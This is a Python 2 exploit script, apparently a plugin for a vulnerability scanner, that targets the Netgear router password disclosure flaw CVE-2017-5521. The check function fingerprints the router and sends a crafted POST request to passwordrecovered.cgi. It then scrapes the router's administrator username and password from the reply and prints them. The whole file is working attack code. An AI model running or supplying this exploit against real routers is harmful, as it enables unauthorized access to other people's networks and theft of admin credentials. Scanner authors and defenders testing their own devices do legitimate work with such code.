# coding=utf-8
import socket
import binascii
import requests

def get_plugin_info():
    plugin_info = {
        "name": "Netgear 路由器密码泄露漏洞(CVE-2017-5521)",
        "info": "Netgear 路由器密码泄露漏洞(CVE-2017-5521)",
        "exp_url": "https://www.seebug.org/vuldb/ssvid-92639;http://www.securityfocus.com/bid/95457/info",
        "docker": "",
        "other": ""
    }
    return plugin_info

def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return "i_dont_speak_english"

def check(ip, port, timeout):
    url = 'http://' + ip + ':' + port + '/'
    try:
        r = requests.get(url)
    except:
        url = 'https://' + ip + ':' + port + '/'
        r = requests.get(url, verify=False)
    model = r.headers.get('WWW-Authenticate')
    if model is not None:
        print "Attacking: " + model[13:-1]
    else:
        print "not a netgear router"
    # 2nd stage
    url = url + 'passwordrecovered.cgi?id=get_rekt'
    try:
        r = requests.post(url, verify=False)
    except:
        print "not vulnerable router"
    # profit
    if r.text.find('left\">') != -1:
        username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
        username = scrape(username, '>', '\'')
        password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
        password = scrape(password, '>', '\'')
        if username == "i_dont_speak_english":
            username = (scrape(r.text[r.text.find('left\">'):-1], 'left\">', '</td>'))
            password = (scrape(r.text[r.text.rfind('left\">'):-1], 'left\">', '</td>'))
    else:
        print "not vulnerable router, or some one else already accessed passwordrecovered.cgi, reboot router and test again"
    # html encoding pops out of nowhere, lets replace that
    password = password.replace("#", "#")
    password = password.replace("&", "&")
    print "user: " + username
    print "pass: " + password
